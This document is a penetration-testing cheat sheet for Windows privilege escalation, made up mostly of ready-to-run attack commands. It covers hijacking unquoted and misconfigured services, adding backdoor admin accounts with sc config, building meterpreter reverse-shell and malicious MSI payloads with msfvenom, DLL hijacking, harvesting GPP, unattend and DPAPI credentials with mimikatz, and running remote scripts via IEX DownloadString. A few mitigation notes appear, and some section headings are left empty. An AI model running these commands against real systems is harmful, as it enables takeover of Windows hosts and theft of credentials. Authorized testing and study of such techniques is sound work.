# Privilege Escalation

## Options
- Missing Patches
- Automated Deployment and Auto Logon Passwords
- AlwaysInstallElevated (any user can run MSI as SYSTEM)
- Misconfigured Services

## Guides
- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
- Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html

## Tools
- https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe
- BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows
- Windows-Exploit-Suggester - https://github.com/GDSSecurity/Windows-Exploit-Suggester
- Check Insecure Services: https://gist.github.com/wdormann/db533d84df57a70e9580a6a2127e33bb

## Metasploit

In 32bit systems:
```
local_exploit_suggester
```

In 64bit systems:
```
search exploit/windows/local
```
## PowerUp

PowerUp to check for all service misconfigurations:
```
Invoke-AllChecks
```

### Service Unquoted Path

```powershell
Get-ServiceUnquoted -Verbose
```

```powershell
Get-WmiObject -Class win32_service | f` *
```

When service path is unquoted:
```
C:\PROGRAM FILES\SUB DIR\PROGRAM NAME
```

Areas we can place files for exploit are marked with *
```
C:\PROGRAM*FILES\SUB*DIR\PROGRAM*NAME
```

Examples:
```
c:\program.exe files\sub dir\program name
c:\program files\sub.exe dir\program name
c:\program files\sub dir\program.exe name
```

### Service binary in a location writable to current user

Replace the binary to gain code execution.

```
Get-ModifiableServiceFile -Verbose
```

### Service can be modified by current user

```
Get-ModifiableService -Verbose
```

## Techniques

### Service Unquoted Path

- `exploit/windows/local/trusted_service_path`

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```
```
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

Leads to running:
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
```

Insecure Setup:
```
C:\Program Files (x86)>icacls "C:\Program Files (x86)\Program Folder" /grant Everyone:(OI)(CI)F /T

F = Full Control
CI = Container Inherit – This flag indicates that subordinate containers will inherit this ACE.
OI = Object Inherit – This flag indicates that subordinate files will inherit the ACE.
```
```
sc stop "Vulnerable Service"
sc start "Vulnerable Service"

OR

shutdown /r /t 0
```

Need to migrate (auto-migration)

### Folder & Service Executable Privileges

- When new folders are created in the root it is writeable for all authenticated users by default. (NT AUTHORITY\Authenticated Users:(I)(M))
- So any application that gets installed on the root can be tampered with by a non-admin user.
    - If binaries load with SYSTEM privileges from this folder it might just be a matter of replacing the binary with your own one.
- https://msdn.microsoft.com/en-us/library/bb727008.aspx

If folder is writable, drop a exe and use "Service Unquoted Path" to execute:
```
icacls "C:\Program Files (x86)\Program Folder"
```

If service exe is writable to everyone, low privilege user can replace the exe with some other binary:
```
icacls example.exe
```

```
F = Full Control
CI = Container Inherit - This flag indicates that subordinate containers will inherit this ACE.
OI = Object Inherit - This flag indicates that subordinate files will inherit the ACE.
```

```
accesschk.exe -dqv "C:\" /accepteula
```

### Insecure Service Permissions

- `exploit/windows/local/service_permissions`

#### Approach 1 - Check permissions of service
```
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
```
If service is editable, change the `ImagePath` to another exe.
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\testuser\AppData\Local\Temp\Payload.exe" /f
```

or create a local admin with:
```
sc config "Vulnerable Service" binpath="net user eviladmin P4ssw0rd@ /add
sc config "Vulnerable Service" binpath="net localgroup Administrators eviladmin /add"
```

#### Approach 2 - Check services a given user can edit
```
accesschk.exe -uwcqv "testuser" *
```

```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv * /accepteula

sc config upnphost binpath= "net user /add amxuser1 amxpass1234"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net stop upnphost
net start upnphost
net start upnphost

sc config upnphost binpath= "net localgroup administrators amxuser1 /add"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net stop upnphost
net start upnphost
net start upnphost

sc config upnphost binpath= "net localgroup \"Remote Desktop Users\" amxuser1 /add"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net stop upnphost
net start upnphost
net start upnphost
```

### AlwaysInstallElevated
- `exploit/windows/local/always_install_elevated`

```
[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
"AlwaysInstallElevated"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
"AlwaysInstallElevated"=dword:00000001
```
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Installing MSI:
```
msiexec /quiet /qn /i malicious.msi
```

Payload Generation:
```
msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi
```
```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" > malicious.msi
```

### Task Scheduler

- On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges.
- Works only on  Windows 2000, XP, or 2003
- Must have local administrator

```
> net start "Task Scheduler"
> time
> at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
```

### DLL Hijacking (DLL preloading attack or a binary planting attack)

- https://msdn.microsoft.com/en-us/library/windows/desktop/ff919712(v=vs.85).aspx
- Search order: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx

```
When an application dynamically loads a dynamic-link library without specifying a fully qualified path name, Windows attempts to locate the DLL by searching a well-defined set of directories in a particular order, as described in Dynamic-Link Library Search Order.

The directory from which the application loaded.
The system directory.
The 16-bit system directory.
The Windows directory.
The current directory.
The directories that are listed in the PATH environment variable.
```

- Services running under SYSTEM does not search through user path environment.

Example:
```
#include "stdafx.h"
#include "windows.h"
void _tmain(int argc, _TCHAR* argv[])
{
  LoadLibrary(L"hijackable.dll");
}
```

Identify processes / services
- Use procman (https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx).
    - Filter `Result` = `NAME NOT FOUND` and `Path` ends with `dll`
- Look at the registry key `ServiceDll` of services (`Parameters`).

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.60 lport=8989 -f dll > hijackable.dll
```
#### Windows 7

```
IKE and AuthIP IPsec Keying Modules (IKEEXT) – wlbsctrl.dll
Windows Media Center Receiver Service (ehRecvr) – ehETW.dll
Windows Media Center Scheduler Service (ehSched) – ehETW.dll
```

Can run Media Center services over command line:
```
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\mcupdate”
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\MediaCenterRecoveryTask”
schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\ActivateWindowsSearch”
```

#### Windows XP

```
Automatic Updates (wuauserv) – ifsproxy.dll
Remote Desktop Help Session Manager (RDSessMgr) – SalemHook.dll
Remote Access Connection Manager (RasMan) – ipbootp.dll
Windows Management Instrumentation (winmgmt) – wbemcore.dll
```
```
Audio Service (STacSV) – SFFXComm.dll SFCOM.DLL
Intel(R) Rapid Storage Technology (IAStorDataMgrSvc) – DriverSim.dll
Juniper Unified Network Service(JuniperAccessService) – dsLogService.dll
Encase Enterprise Agent – SDDisk.dll
```

#### Migrations

##### CWDIllegalInDllSearch

- Allow user to change DLL search path algorithm

```
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]
    CWDIllegalInDllSearch
```
1, 2 or ffffffff ?

```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ dlls not loaded ] The current working directory (CWD)            
Directories in the PATH environment variable (system then user)
```
##### SetDllDirectory

- Removes the current working directory (CWD) from the search order

SetDllDirectory(“C:\\program files\\MyApp\\”) :
```
The directory from which the application loaded
[ added ] C:\program files\MyApp\                                    
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ removed ] The current working directory (CWD)             
Directories in the PATH environment variable (system then user)
```

SetDllDirectory("")
```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
[ removed ] The current working directory (CWD)
Directories in the PATH environment variable (system then user)
```

##### SafeDllSearchMode

- Enabled by default
- Can disable using `[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]`
- Calling the SetDllDirectory(“”) or SetDllDirectory(“C:\\program files\\MyApp\\”) disables SafeDllSearchMode and uses the search order described for SetDllDirectory.

##### DEV

- LoadLibraryEx (additional argument)
- SetEnvironmentVariable(TEXT(“PATH”),NULL)
- Change default installation folder to C:\Program Files
- Fully qualified path when loading DLLs
- Use SetDllDirectory(“”) API removing the current working directory from the search order
- If software needs to be installed on the root check there are no binaries needing SYSTEM privileges
- If SYSTEM privileges are required then change the ACL’s of the folder
- Remove the path entry from the SYSTEM path variable if not needed

When enabled
```
The directory from which the application loaded
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)
The current working directory (CWD)           
Directories in the PATH environment variable (system then user)
```

When disabled
```
The directory from which the application loaded
[ moved up the list ] The current working directory (CWD)                   
32-bit System directory (C:\Windows\System32)
16-bit System directory (C:\Windows\System)
Windows directory (C:\Windows)   
Directories in the PATH environment variable (system then user)
```

### Stored Credentials

```
C:\unattend.xml
C:\sysprep.inf
C:\sysprep\sysprep.xml
```

```
dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | findstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
```

#### Unattended Installations

- `post/windows/gather/enum_unattend`
- Look for `UserAccounts` tag of `Unattend.xml`, `sysprep.xml` and `sysprep.inf` across the system, including:
```
C:\Windows\Panther\
C:\Windows\Panther\Unattend\
C:\Windows\System32\
C:\Windows\System32\sysprep\
```
- Microsoft appends "Password" to all passwords within Unattend files before encoding them.

#### Group Policy Preferences (GPP)
- Introduced from Windows Server 2008
  - https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati
- `GPP` allows for configuration of Domain-attached machines via `group policy`.
  - Map drives (Drives.xml)
  - Create Local Users
  - Data Sources (DataSources.xml)
  - Printer configuration (Printers.xml)
  - Create/Update Services (Services.xml)
  - Scheduled Tasks (ScheduledTasks.xml)
  - Change local Administrator passwords
- GPPs are stored in the `SYSVOL` share, which is world-readable to authenticated users.
  - `\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`
  - `findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml`
- Domain machines periodically reach out and authenticate to the Domain Controller utilizing the Domain credentials of the `logged-in user` and pull down policies.
- Group Policies for account management are stored on the Domain Controller in `Groups.xml` files buried in the `SYSVOL` folder (`\\Domain\SYSVOL\<DOMAIN>\Policies`)
- `cpassword` is used to set passwords for the Local Administrator account.
- Password is AES-256 encrypted using a published key: [https://msdn.microsoft.com/en-us/library/Cc422924.aspx](https://msdn.microsoft.com/en-us/library/Cc422924.aspx)
- Metasploit: `post/windows/gather/credentials/gpp`
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
  - Get-CachedGPPPassword //For locally stored GP Files
  - Get-GPPPassword //For GP Files stored in the DC
- `Get-DecryptedPassword` to decrypt the AES encryption
- http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip

https://pentestlab.blog/tag/cpassword/

Decrypt encrypted password:
```
gpp-decrypt $cpassword
```

```
Get-GPPPassword
Get-NetOU -GUID "{4C86DD57-4040-41CD-B163-58F208A26623}" | %{ Get-NetComputer -ADSPath $_ }
// All OUs connected to policy | List all domain machines tied to OU
```

```
IEX(New-Object Net.WebClient).DownloadString("http://192.168.100.3/tmp/PowerUp.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://192.168.100.3/tmp/PowerView.ps1")

Get-CachedGPPPassword
```

- Future - Local Administrator Password Solution (LAPS): https://www.microsoft.com/en-us/download/details.aspx?id=46899

#### Defense

- Prevent passwords from getting added to GPP (KB2962486) and delete existing GPP from SYSVOL containing passwords.
- **[ALERTING]** Detect by setting Everyone:DENY on SYSVOL GPP file. (Logs: Audit access denied)

### Token Impersonation

PowerSploit / Incognito

List all tokens
```
Invoke-TokenManipulation -ShowAll
```

List all unique and usable tokens
```
Invoke-TokenManipulation -Enumerate
```

Start new process with token of a user
```
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
```

Start new process with token of another process
```
Invoke-TokenManipulation -CreateProcess "C:\Windown\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
```

### cmdkey

- Creates, lists, and deletes stored user names and passwords or credentials.
- Usable with "runas /savecred"

```
cmdkey /list
```

Run a command as admin:
```
runas /user:ACCESS\Administrator /savecred ​ "powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2/admin.ps1')
```

```
powershell.exe -Credential "TestDomain\Me" -NoNewWindow -ArgumentList "Start-Process powershell.exe -Verb runAs"
```

Find all `runas` shortcuts:
```
Get-ChildItem​ ​ "C:\"​ *.lnk -Recurse -Force | ft fullname | ​ Out-File​ shortcuts.txt

ForEach​ ( ​ $file​ ​ in​ gc .\shortcuts.txt) { ​ Write-Output​ ​ $file​ ; gc ​ $file​ |
Select-String​ runas }
```

#### Windows Data Protection API

Locating `credential files`
```
cmd​ /c "​ dir​ /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & ​ dir​ /S /AS
C:\Users\security\AppData\Local\Microsoft\Credentials & ​ dir​ /S /AS
C:\Users\security\AppData\Local\Microsoft\Protect & ​ dir​ /S /AS
C:\Users\security\AppData\Roaming\Microsoft\Vault & ​ dir​ /S /AS
C:\Users\security\AppData\Roaming\Microsoft\Credentials & ​ dir​ /S /AS
C:\Users\security\AppData\Roaming\Microsoft\Protect"
```

Transfer
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes(​ "C:\Users\security\AppData\Roamin
g\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"​ ))
```
```
[IO.File]::WriteAllBytes(​ "51AB168BE4BDB3A603DADE4F8CA81290"​ ,
[Convert]::FromBase64String(​ "AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6
VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI
ABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAA
AA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7
c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WH
hvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxd
lugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHC
KaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/z
BU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ
=="​ ))
```

Extraction credential file -> masterkey (guidMasterKey)
- [https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

```
dpapi::​ cred​ /​ in​ :51​ AB168BE4BDB3A603DADE4F8CA81290
/​ sid:S​ -1-5-21-953262931-566350628-63446256-1001 /​ password​ :4​ Cc3ssC0ntr0ller
```

Examine master key file
```
dpapi::​ masterkey​ /​ in​ :0792​ c32e​ -48​ a5​ -4​ fe3​ -8​ b43​ - ​ d93d64590580
/​ sid:S​ -1-5-21-953262931-566350628-63446256-1001 /​ password​ :4​ Cc3ssC0ntr0ller
```

Decrypt credential blob
```
dpapi::​ cred​ /​ in​ :51​ AB168BE4BDB3A603DADE4F8CA81290
```

### Using Kernel Exploit

Installed updates:
```
wmic qfe get Caption,Description,HotFixID,InstalledOn

```
KiTrap0d

## Using logical flaws

### Directory Replication Service (DRSR)

###Netlogon Remote Service (NRPC)

###BackupKey Remote Service (BKRP)

###Local Service Authority (Domain Policy) Remote Protocol (LSAD)

###Privilege Attribute Certificate Data Structure (PAC)

### Kerberos

#### Kerberos Protocol Extension (KILE)

#### Kerberos Protocol Extension, Service for User and Constrained Delegation Protocol (SFU)

### Add user using service misconfiguration

## References

> - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
> - http://www.greyhathacker.net/?p=738
> - https://toshellandback.com/2015/11/24/ms-priv-esc
> - https://www.toshellandback.com/2015/08/30/gpp/
